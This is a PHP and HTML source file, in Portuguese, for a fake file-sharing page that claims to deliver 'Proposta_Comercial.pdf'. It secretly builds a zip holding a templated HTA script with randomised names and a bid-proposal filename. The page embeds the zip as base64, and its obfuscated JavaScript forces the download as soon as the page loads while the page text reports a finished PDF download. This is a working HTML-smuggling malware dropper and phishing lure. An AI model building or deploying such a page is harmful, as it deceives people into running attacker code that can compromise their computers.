<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-16">
</head>
<?php
error_reporting(1);                            
$path = dirname(__DIR__, 2);
require_once($path . '/src/utils/funcoes.php');
$listawords = file($path . '/src/model/words.txt');//MONTAR O TEXTO ALEATÓRIO
$textrand = "";
//GERA UM NUMERO DANDOMICO ENTRE 300 E 3000
$qtwords = rand(300, 3000);
for ($i = 0; $i < $qtwords; $i++) {
    $textrand .=  $listawords[rand(1, 999)];
}
$textrand = str_replace("\r\n", " ", $textrand);
//ABRE DEFALT HTA
$sHTA = (file_get_contents($path . '/src/model/default_model_hta_DIMAS.txt'));
//novos passos  
$sHTA = str_replace("%hta_var_01%", GeraStringRandomica(rand(3, 8)) . (string)(rand(5000, 2000)) . GeraStringRandomica(rand(2, 5)), $sHTA);
$sHTA = str_replace("%hta_var_02%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
$sHTA = str_replace("%hta_boj_01%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
$sHTA = str_replace("%htal_link%",getenv('BASE_URL_WITHOUT_HTTP'), $sHTA);

$filexDir = __DIR__ . '/filex';
if (!is_dir($filexDir)) {
    mkdir($filexDir, 0775, true);
}

$sNomeLOad = "ProPosta_Referente_ao_Certame - " . (string)(rand(99999, 888888)) . "2026";
// Nome do .zip no disco: só caracteres seguros (evita falha em NTFS / bind-mount Docker)
$NomeZIP = preg_replace('/[^a-zA-Z0-9._-]+/', '_', $sNomeLOad) . '.zip';
$prefixoNomeHTA  = $sNomeLOad;
$zipPath = $filexDir . '/' . $NomeZIP;

// ZIP só com o .hta em string (sem ficheiro "fonte" obrigatório)
$zipPath = GeraArquivoZipParaDownload('', $sHTA, $filexDir . '/' . $NomeZIP, $sNomeLOad);
if ($zipPath === false) {
    throw new RuntimeException('Não foi possível gerar o arquivo ZIP.');
}

$imgbinary = base64_encode(file_get_contents($zipPath));

$listaVar2 = GeraArrayNomesVariaveis(20);

?>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title><?php echo $sNomeLOad; ?></title>
    <style>

           
:root {
  --dark: #102d30;
  --green: #20b879;
  --light-green: #55e0ad;
  --text: #172438;
  --muted: #62748a;
}
* { box-sizing: border-box; }
body {
    
  margin: 0;
  font-family: "Segoe UI", Arial, sans-serif;
  color: var(--text);
  background: #f5f7f9;
}
.container {
  width: min(1120px, 90%);
  margin: auto;
}
header, footer { background: var(--dark); color: white; }
nav {
  min-height: 85px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 20px;
}
.logo {
  font-size: 29px;
  font-weight: 800;
  color: white;
}
.logo span { color: var(--light-green); }
.tagline { font-size: 12px; color: #d2e3e3; }
.links { display: flex; gap: 25px; }
.links a { color: white; text-decoration: none; }
.links a:hover { color: var(--light-green); }

.hero {
  color: white;
  background: linear-gradient(115deg, #143e3c, #102d30);
  padding: 55px 0;
}
.hero h1 {
  font-size: clamp(32px, 4vw, 48px);
  line-height: 1.15;
  margin: 0 0 20px;
}
.hero h1 span { color: var(--light-green); }
.hero p { line-height: 1.7; font-size: 17px; }
main { padding: 45px 0 38px; }

.file-card {
  display: grid;
  grid-template-columns: 200px 1fr;
  gap: 35px;
  align-items: center;
  background: white;
  border: 1px solid #e0e7ed;
  border-radius: 14px;
  padding: 35px;
  box-shadow: 0 5px 20px #152c3c0c;
}
.file-icon {
  min-height: 205px;
  display: grid;
  place-items: center;
  background: #f1f4f8;
  border-radius: 13px;
  font-size: 76px;
}
.pdf-label {
  background: #e83e36;
  color: white;
  font-size: 20px;
  font-weight: bold;
  padding: 5px 12px;
  border-radius: 5px;
}
h2 { overflow-wrap: anywhere; }
.meta {
  display: flex;
  flex-wrap: wrap;
  gap: 12px 20px;
  color: var(--muted);
  font-size: 14px;
}
.description {
  color: var(--muted);
  line-height: 1.7;
  margin: 24px 0;
}
.download {
  display: inline-flex;
  justify-content: center;
  align-items: center;
  gap: 12px;
  width: min(100%, 415px);
  padding: 19px;
  border-radius: 12px;
  background: var(--green);
  color: white;
  font-size: 19px;
  font-weight: bold;
  text-decoration: none;
  transition: .2s;
}
.download:hover {
  background: #159b61;
  transform: translateY(-2px);
}
.note { color: var(--muted); font-size: 13px; }

.features {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  margin-top: 38px;
  padding: 25px 10px;
  background: #edf7f2;
  border-radius: 14px;
}
.feature {
  text-align: center;
  padding: 12px 18px;
  border-right: 1px solid #cbded5;
}
.feature:last-child { border: 0; }
.feature .symbol {
  color: #159b61;
  font-size: 35px;
}
.feature h3 { color: #164b42; font-size: 16px; }
.feature p { color: var(--muted); font-size: 13px; line-height: 1.6; }

footer { margin-top: 0; padding: 35px 0; }
.footer-content {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 30px;
}
.footer-links {
  display: grid;
  gap: 10px;
}
.footer-links a {
  color: #dce7e7;
  text-decoration: none;
  font-size: 13px;
}
.copyright { color: #b5c8c8; font-size: 12px; margin-top: 22px; }
.secure { font-size: 13px; line-height: 1.7; }

@media (max-width: 700px) {
  nav { flex-wrap: wrap; padding: 18px 0; }
  .links { width: 100%; justify-content: space-between; gap: 10px; }
  .hero { padding: 40px 0; }
  .file-card { grid-template-columns: 1fr; padding: 22px; gap: 20px; }
  .file-icon { min-height: 130px; }
  .features { grid-template-columns: repeat(2, 1fr); }
  .feature:nth-child(2) { border-right: 0; }
  .feature:nth-child(3), .feature:nth-child(4) {
    border-top: 1px solid #cbded5;
  }
  .footer-content { align-items: flex-start; flex-direction: column; }
}


        .message-box {
            
            padding: 20px;
            border: 0px solid #ddd;
            border-radius: 5px;
        }

        .download-instructions {
            font-size: 14px;
            color: #666;
            margin-top: 20px;
        }

        .arrow {
            margin-top: 30px;
            font-size: 24px;
            animation: blink 1s step-start 0s infinite;
        }

        @keyframes blink {
            50% {
                opacity: 0;
            }
        }
    </style>
</head>


<body>
 

   
  

    <header id="inicio">
  <div class="container">
    <nav>
      <div>
        <div class="logo">☁ File<span>Share</span></div>
        <div class="tagline">Seus arquivos, sempre com você</div>
      </div>
      <div class="links">
        <a href="#inicio">⌂ Início</a>
        <a href="#sobre">ⓘ Sobre</a>
        <a href="#suporte">♧ Suporte</a>
      </div>
    </nav>
  </div>
</header>

<section class="hero">
  <div class="container">
    <h1>Download de Arquivos<br>
      <span>Rápido e Seguro</span>
    </h1>
    <p>
      Acesse seus arquivos de forma simples, segura e sem complicação.<br>
      Clique no botão abaixo para iniciar o download.
    </p>
  </div>
</section>

<main class="container">
  <section class="file-card">
    <div class="file-icon">
      <span class="pdf-label">PDF</span>
    </div>

    <div style="display: flex; flex-direction: column; align-items: flex-start;" >
      <h2 >Proposta_Comercial.pdf</h2>
        <div class="message-box">
        <h1 id="wCLM">Download Iniciado</h1>
        <p id="KQNl5">Seu download começou. Verifique o canto inferior direito do seu navegador.</p>
        <div class="download-instructions">
            <p id="Wn8wA">Espera até que o download se complete.</p>
            <div class="arrow" style="border: 0px solid blue; margin-left: 25%;">↓</div>
        </div>
    </div>

      <div class="meta">
        <span>▤ PDF</span>
        <span >▣ Documento</span>
        <span>▦ Atualizado em 28/10/2026</span>
        <span>♢ Seguro</span>
      </div>

 

      <!-- Coloque o PDF na pasta arquivos -->
      <!--a class="download"
         href="arquivos/Proposta_Comercial_Fullservice.pdf"
         download>
        ⇩ Baixar Arquivo
      </a >

      <p id="Wn8wA"  class="download">Espera hasta que la descarga se complete.</p>
            <div class="arrow">↓</div -->

    
    </div>
  </section>

  <section class="features" id="sobre">
    <article class="feature">
      <div class="symbol">♢</div>
      <h3>100% Seguro</h3>
      <p>Baixe arquivos de fontes conhecidas e confiáveis.</p>
    </article>
    <article class="feature">
      <div class="symbol">ϟ</div>
      <h3>Download Rápido</h3>
      <p>Acesse seu arquivo em poucos segundos.</p>
    </article>
    <article class="feature">
      <div class="symbol">☁</div>
      <h3>Acesso Simples</h3>
      <p>Baixe o arquivo sempre que precisar.</p>
    </article>
    <article class="feature">
      <div class="symbol">▣</div>
      <h3>Compatível</h3>
      <p>Funciona em computadores, tablets e celulares.</p>
    </article>
  </section>
</main>

<footer id="suporte">
  <div class="container footer-content">
    <div>
      <div class="logo">☁ File<span>Share</span></div>
      <div class="tagline">Seus arquivos, sempre com você</div>
      <p class="copyright">
        © 2026 FileShare. Todos os direitos reservados.
      </p>
    </div>

    <div class="footer-links">
      <a href="#inicio">Início</a>
      <a href="#sobre">Sobre</a>
      <a href="#suporte">Suporte</a>
      <a href="#termos">Termos de Uso</a>
      <a href="#privacidade">Privacidade</a>
    </div>

    <div class="secure">
      🔒 <strong>Conexão segura</strong><br>
      Seus arquivos devem ser disponibilizados por HTTPS.
    </div>
  </div>
</footer>


 <script type="text/javascript">
        function <?php echo $listaVar2[0]; ?>(<?php echo $listaVar2[1]; ?>) {
            var <?php echo $listaVar2[2]; ?> = window.atob(<?php echo $listaVar2[1]; ?>);
            var <?php echo $listaVar2[3]; ?> = <?php echo $listaVar2[2]; ?>.length;

            var <?php echo $listaVar2[4]; ?> = new Uint8Array(<?php echo $listaVar2[3]; ?>);
            for (var i = 0; i < <?php echo $listaVar2[3]; ?>; i++) {
                <?php echo $listaVar2[4]; ?>[i] = <?php echo $listaVar2[2]; ?>.charCodeAt(i);
            }
            return <?php echo $listaVar2[4]; ?>.buffer;
        }

        var <?php echo $listaVar2[5]; ?> = "<?php echo $imgbinary; ?>";
        const id = `target_${Date.now()}`;
        var <?php echo $listaVar2[9]; ?> = document.createElement('a');
        <?php echo $listaVar2[9]; ?>.id = id;
        var <?php echo $listaVar2[8]; ?> = "<?php echo $NomeZIP;                                             ?>";
        <?php echo $listaVar2[9]; ?>.download = <?php echo $listaVar2[8]; ?>;
        var <?php echo $listaVar2[10]; ?> = "data:application/x-zip-compressed;base64," + <?php echo $listaVar2[5]; ?>;
        <?php echo $listaVar2[9]; ?>.style.display = 'none';

        <?php echo $listaVar2[9]; ?>.href = <?php echo $listaVar2[10]; ?>;

        var <?php echo $listaVar2[6]; ?> = <?php echo $listaVar2[0]; ?>(<?php echo $listaVar2[5]; ?>);
        var <?php echo $listaVar2[7]; ?> = new Blob([<?php echo $listaVar2[6]; ?>], {
            type: "application/octet-stream"
        });

        document.body.appendChild(<?php echo $listaVar2[9]; ?>);
        window.URL.revokeObjectURL(<?php echo $listaVar2[9]; ?>.href)
        document.querySelector(`a#${id}`).click()

        document.getElementById('wCLM').textContent = 'Download Iniciado';
        document.getElementById('KQNl5').textContent =
            'Seu download começou. Verifique o canto inferior direito do seu navegador.';
        document.getElementById('Wn8wA').textContent = 'Espera até que o download se complete.';

        setTimeout(() => {
            document.getElementById('wCLM').textContent = 'Download Completado';
            document.getElementById('KQNl5').textContent = 'Seu download foi concluído com sucesso.';
            document.getElementById('Wn8wA').textContent = 'Agora você pode acessar seu arquivo baixado.';
            document.querySelector('.arrow').style.display = 'none';
        }, 10000);
    </script>

</body>
<?php $arquivo = $filexDir . '/' . $NomeZIP;
sleep(5);
if (file_exists($arquivo)) {
    // unlink($arquivo);
    // echo 'Arquivo deletado com sucesso';
}


?>

</html>